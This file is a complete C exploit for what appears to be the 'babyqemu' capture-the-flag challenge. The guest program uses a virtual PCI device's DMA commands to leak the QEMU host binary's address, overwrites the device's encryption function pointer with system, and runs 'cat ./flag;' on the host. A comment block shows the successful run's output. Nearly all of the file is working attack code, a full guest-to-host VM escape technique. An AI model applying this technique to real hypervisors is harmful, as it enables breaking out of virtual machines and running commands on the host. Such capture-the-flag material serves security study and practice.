/*
* author: w0lfzhang
* date: 2018.12.4
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <assert.h>

#define PRINT_ERROR \
	do { \
		fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
		__LINE__, __FILE__, errno, strerror(errno)); exit(1); \
	} while(0)

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

int fd = -1;

char *filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";

//not used~
void pcimem_read(uint64_t target, char access_type, uint64_t *read_result)
{
	/* Map one page */
	void *map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
	if(map_base == (void *) -1) PRINT_ERROR;
	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);

	void *virt_addr = map_base + (target & MAP_MASK);
	int type_width = 0;

	switch(access_type) 
	{
		case 'b':
			*read_result = *((uint8_t *) virt_addr);
			type_width = 1;
			break;
		case 'h':
			*read_result = *((uint16_t *) virt_addr);
			type_width = 2;
			break;
		case 'w':
			*read_result = *((uint32_t *) virt_addr);
			type_width = 4;
			break;
		case 'd':
			*read_result = *((uint64_t *) virt_addr);
			type_width = 8;
			break;
	}

	printf("Value at offset 0x%X (%p): 0x%0*lX\n", (int) target, virt_addr, type_width*2, *read_result);
	if(munmap(map_base, MAP_SIZE) == -1) 
		PRINT_ERROR;
}

void pcimem_write(uint64_t target, char access_type, uint64_t writeval) 
{
	/* Map one page */
	void *map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
	if(map_base == (void *) -1) PRINT_ERROR;
	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
	uint64_t read_result = 0;

	int type_width = 0;
	void *virt_addr = map_base + (target & MAP_MASK);

	switch(access_type) 
	{
		case 'b':
			*((uint8_t *) virt_addr) = writeval;
			read_result = *((uint8_t *) virt_addr);
			type_width = 1;
			break;
		case 'h':
			*((uint16_t *) virt_addr) = writeval;
			read_result = *((uint16_t *) virt_addr);
			type_width = 2;
			break;
		case 'w':
			*((uint32_t *) virt_addr) = writeval;
			read_result = *((uint32_t *) virt_addr);
			type_width = 4;
			break;
		case 'd':
			*((uint64_t *) virt_addr) = writeval;
			read_result = *((uint64_t *) virt_addr);
			type_width = 8;
			break;
	}
	//readback not correct?
	printf("Written 0x%0*lX; readback 0x%*lX\n", type_width, writeval, type_width, read_result);
	if(munmap(map_base, MAP_SIZE) == -1) 
		PRINT_ERROR;
}

uint64_t virt2phys(void* p)
{
	uint64_t virt = (uint64_t)p;

    // Assert page alignment
	assert((virt & 0xfff) == 0);

	int fd = open("/proc/self/pagemap", O_RDONLY);
	if (fd == -1)
		PRINT_ERROR;

	uint64_t offset = (virt / 0x1000) * 8;
	lseek(fd, offset, SEEK_SET);

	uint64_t phys;
	if (read(fd, &phys, 8 ) != 8)
		PRINT_ERROR;

    // Assert page present
	assert(phys & (1ULL << 63));

	phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
	return phys;
}

int main(int argc, char *argv[])
{
	if((fd = open(filename, O_RDWR | O_SYNC)) == -1)
		PRINT_ERROR;

	//for dma read and write
	void *dma_addr = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (dma_addr == (void *)-1)
		PRINT_ERROR;

	//note that cpu_physical_memory_rw needs a physical address
	//so we must transfer our mmap-addr into physical address
	mlock(dma_addr, 0x1000);   //necessary and important!
	void *dma_phy_addr = (void *)virt2phys(dma_addr);

	//step 1: leaking binary's address

	//set src first, if you set dst first, trouble comes~, I don't know why.
	//set dma.src
	pcimem_write(0x80, 'd', (uint64_t)(0x40000 + 0x1000));
	//set dma.dst
	pcimem_write(0x88, 'd', (uint64_t)dma_phy_addr);
	//set dma.cnt
	pcimem_write(0x90, 'd', (uint64_t)0x8);
	//set dma.cmd and trigger timer_func
	pcimem_write(0x98, 'd', (uint64_t)(1 | 2));
	sleep(1);
	/*
	gef➤  p (*(HitbState*)0x555557f83e30).dma
	$3 = {
 	src = 0x41000, 
  	dst = 0x340a000, 
  	cnt = 0x8, 
  	cmd = 0x3
	}

	*/

	uint64_t bin_addr = *(uint64_t *)dma_addr - 0x283DD0;
	printf("[+] binary @ 0x%lX\n", bin_addr);
	uint64_t system_addr = bin_addr + 0x1FDB18;
	printf("[+] system @ 0x%lX\n", system_addr);

	//step 2: overwriting enc as system@plt

	//set dma.src
	*(uint64_t*)dma_addr = system_addr;
	pcimem_write(0x80, 'd', (uint64_t)dma_phy_addr);
	//set dma.dst
	pcimem_write(0x88, 'd', (uint64_t)(0x40000 + 0x1000));
	//set dma.cnt
	pcimem_write(0x90, 'd', (uint64_t)0x8);
	//set dma.cmd and trigger timer_func
	pcimem_write(0x98, 'd', (uint64_t)1);
	sleep(1);

	//step 3: copy cat ./flag to dma_buf 
	memcpy(dma_addr, "cat ./flag;", 11);
	pcimem_write(0x80, 'd', (uint64_t)dma_phy_addr);
	//set dma.dst
	pcimem_write(0x88, 'd', (uint64_t)0x40000);
	//set dma.cnt
	pcimem_write(0x90, 'd', (uint64_t)0xb);
	//set dma.cmd and trigger timer_func
	pcimem_write(0x98, 'd', (uint64_t)1);
	sleep(1);

	//step 4: trigger hitb_enc
	pcimem_write(0x98, 'd', (uint64_t)(1 | 4));
	sleep(1);

	return 0;
}

/*
# ./exp
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00041000; readback 0x   41000
PCI Memory mapped to address 0x7fd99e923000.
Written 0x03414000; readback 0x 3414000
PCI Memory mapped to address 0x7fd99e923000.
[   20.297551] random: fast init done
Written 0x00000008; readback 0xFFFFFFFF00000008
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00000003; readback 0xFFFFFFFF00000003
[+] binary @ 0x55A1EEF1B000
[+] system @ 0x55A1EF118B18
PCI Memory mapped to address 0x7fd99e923000.
Written 0x03414000; readback 0x 3414000
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00041000; readback 0x   41000
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00000008; readback 0xFFFFFFFF00000008
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00000001; readback 0xFFFFFFFF00000001
PCI Memory mapped to address 0x7fd99e923000.
Written 0x03414000; readback 0x 3414000
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00040000; readback 0x   40000
PCI Memory mapped to address 0x7fd99e923000.
Written 0x0000000B; readback 0xFFFFFFFF0000000B
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00000001; readback 0xFFFFFFFF00000001
PCI Memory mapped to address 0x7fd99e923000.
Written 0x00000005; readback 0xFFFFFFFF00000005
flag{babyqemu's_flag}
*/